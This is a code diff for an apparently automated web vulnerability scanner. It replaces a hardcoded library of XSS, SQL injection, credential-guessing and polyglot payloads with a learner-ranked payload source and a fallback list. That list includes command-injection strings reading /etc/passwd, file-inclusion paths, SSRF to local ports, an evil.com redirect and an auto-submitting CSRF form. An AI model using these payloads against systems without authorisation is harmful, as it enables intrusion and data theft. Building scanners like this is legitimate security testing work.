@@ -46,113 +46,6 @@ class AttackStrategy:
         )
 
 
-class PayloadLibrary:
-    """Library of attack payloads for different attack types."""
-    
-    XSS_PAYLOADS = {
-        'basic': [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-        ],
-        'evasion': [
-            "<ScRiPt>alert('XSS')</ScRiPt>",
-            "<img src=x onerror='alert(1)'>",
-            "<body onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<iframe src='javascript:alert(1)'>",
-        ],
-        'dom': [
-            "'-alert(1)-'",
-            "\"-alert(1)-\"",
-            "</script><script>alert(1)</script>",
-            "{{constructor.constructor('alert(1)')()}}",
-        ],
-        'polyglot': [
-            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
-        ],
-        'detection': [
-            "<penny_test_marker>",
-            "\"'><penny_test>",
-        ]
-    }
-    
-    SQLI_PAYLOADS = {
-        'basic': [
-            "' OR '1'='1",
-            "' OR '1'='1' --",
-            "' OR '1'='1' #",
-            "\" OR \"1\"=\"1",
-            "1' OR '1'='1",
-        ],
-        'union': [
-            "' UNION SELECT NULL--",
-            "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "1' UNION SELECT 1,2,3--",
-        ],
-        'error_based': [
-            "' AND 1=CONVERT(int,(SELECT @@version))--",
-            "' AND extractvalue(1,concat(0x7e,version()))--",
-            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        ],
-        'blind': [
-            "' AND '1'='1",
-            "' AND '1'='2",
-            "' AND SLEEP(5)--",
-            "' AND (SELECT SLEEP(5))--",
-        ],
-        'detection': [
-            "'",
-            "\"",
-            "' OR ''='",
-            "1' AND '1'='1",
-        ]
-    }
-    
-    CSRF_PAYLOADS = {
-        'basic': [
-            # CSRF payloads are HTML templates for creating malicious pages
-        ]
-    }
-    
-    AUTH_PAYLOADS = {
-        'basic': [
-            "admin",
-            "administrator",
-            "' OR '1'='1' --",
-            "admin'--",
-        ],
-        'password': [
-            "password",
-            "123456",
-            "admin123",
-            "password123",
-        ]
-    }
-    
-    @classmethod
-    def get_payloads(cls, attack_type: AttackType, 
-                     intensity: str = 'basic') -> List[str]:
-        """Get payloads for a specific attack type and intensity."""
-        payload_map = {
-            AttackType.XSS: cls.XSS_PAYLOADS,
-            AttackType.SQLI: cls.SQLI_PAYLOADS,
-            AttackType.CSRF: cls.CSRF_PAYLOADS,
-            AttackType.AUTH: cls.AUTH_PAYLOADS,
-        }
-        
-        payloads = payload_map.get(attack_type, {})
-        
-        if intensity == 'all':
-            all_payloads = []
-            for category_payloads in payloads.values():
-                all_payloads.extend(category_payloads)
-            return all_payloads
-        
-        return payloads.get(intensity, payloads.get('basic', []))
-
-
 class AttackSelector:
     """
     Intelligent attack selector that analyzes targets and creates optimal attack strategies.
@@ -166,17 +59,22 @@ class AttackSelector:
     
     def __init__(self, 
                  ai_model: Optional[AIModelInterface] = None,
+                 learner: Optional[Any] = None,
+                 payloads: Optional[Any] = None,
                  scan_mode: ScanMode = ScanMode.ACTIVE):
         """
         Initialize the attack selector.
         
         Args:
             ai_model: AI model interface for enhanced analysis
+            learner: Behavior learner for reinforcement learning
+            payloads: Dynamic payload library
             scan_mode: Scanning mode affecting payload intensity
         """
         self.ai_model = ai_model
+        self.learner = learner
+        self.payloads = payloads
         self.scan_mode = scan_mode
-        self.payload_library = PayloadLibrary()
         
         logger.info(f"Attack Selector initialized with mode: {scan_mode.value}")
     
@@ -197,6 +95,11 @@ class AttackSelector:
         
         # Get recommendations from target analysis
         recommendations = target_analysis.get_recommended_attacks()
+        
+        # Enhance with learner recommendations if available
+        if self.learner:
+            learner_recommendations = self._get_learner_recommendations(target_analysis)
+            recommendations = self._merge_recommendations(recommendations, learner_recommendations)
         
         # Enhance with AI recommendations if available
         if self.ai_model:
@@ -289,6 +192,43 @@ class AttackSelector:
         
         return []
     
+    def _get_learner_recommendations(self, 
+                                     target_analysis: TargetAnalysis) -> List[Dict[str, Any]]:
+        """Get attack recommendations from behavior learner."""
+        try:
+            # Get learner's attack recommendations based on target features
+            features = {
+                'has_forms': len(target_analysis.forms) > 0,
+                'has_params': len(target_analysis.parameters) > 0,
+                'target_type': target_analysis.target_type.value,
+                'technologies': [tech.value for tech in target_analysis.technologies]
+            }
+            
+            recommended_attacks = self.learner.get_attack_recommendation(
+                target_features=features,
+                available_attacks=[at.value for at in AttackType]
+            )
+            
+            # Convert to recommendation format
+            recommendations = []
+            for attack_type_str in recommended_attacks:
+                try:
+                    attack_type = AttackType(attack_type_str.lower())
+                    recommendations.append({
+                        'attack_type': attack_type,
+                        'priority': 'high',
+                        'confidence': 0.9,
+                        'reasons': ['Learned from user behavior patterns']
+                    })
+                except ValueError:
+                    continue
+            
+            return recommendations
+            
+        except Exception as e:
+            logger.warning(f"Learner recommendation failed: {e}")
+            return []
+    
     def _merge_recommendations(self,
                                analysis_recs: List[Dict[str, Any]],
                                ai_recs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
@@ -365,12 +305,19 @@ class AttackSelector:
         if not vectors and attack_type not in [AttackType.CSRF, AttackType.AUTH]:
             vectors = self._create_default_vectors(target_analysis.url, attack_type)
         
-        # Select payloads based on scan mode
-        intensity = self._get_payload_intensity()
-        payloads = self.payload_library.get_payloads(attack_type, intensity)
-        
-        if not payloads:
-            payloads = self.payload_library.get_payloads(attack_type, 'basic')
+        # Select payloads based on scan mode using dynamic library
+        if self.payloads:
+            intensity_limit = 20 if self.scan_mode == ScanMode.AGGRESSIVE else 10
+            payload_objects = self.payloads.get_payloads(
+                attack_type, 
+                limit=intensity_limit, 
+                sort_by_effectiveness=True,
+                learner=self.learner
+            )
+            payloads = [p.vector for p in payload_objects]
+        else:
+            # Fallback payloads
+            payloads = self._get_fallback_payloads(attack_type)
         
         # Must have either vectors or payloads to be useful
         if not payloads:
@@ -511,3 +458,49 @@ class AttackSelector:
         ])
         
         return "\n".join(lines)
+
+    def _get_fallback_payloads(self, attack_type: AttackType) -> List[str]:
+        """Get fallback payloads when dynamic library is not available."""
+        fallbacks = {
+            AttackType.XSS: [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "'><script>alert('XSS')</script>",
+                "<svg onload=alert('XSS')>"
+            ],
+            AttackType.SQLI: [
+                "' OR '1'='1",
+                "' OR '1'='1' --",
+                "' UNION SELECT NULL--",
+                "1' OR '1'='1"
+            ],
+            AttackType.CSRF: [
+                "<form action='/transfer' method='POST'><input name='amount' value='1000'></form><script>document.forms[0].submit()</script>"
+            ],
+            AttackType.AUTH: [
+                "admin",
+                "' OR '1'='1' --",
+                "password"
+            ],
+            AttackType.SSRF: [
+                "http://127.0.0.1:22",
+                "http://localhost:3306"
+            ],
+            AttackType.IDOR: [
+                "../admin/users",
+                "?user_id=1"
+            ],
+            AttackType.RCE: [
+                "; ls -la",
+                "| cat /etc/passwd"
+            ],
+            AttackType.LFI: [
+                "../../../../etc/passwd",
+                "/proc/self/environ"
+            ],
+            AttackType.OPEN_REDIRECT: [
+                "//evil.com",
+                "http://evil.com"
+            ]
+        }
+        return fallbacks.get(attack_type, [])
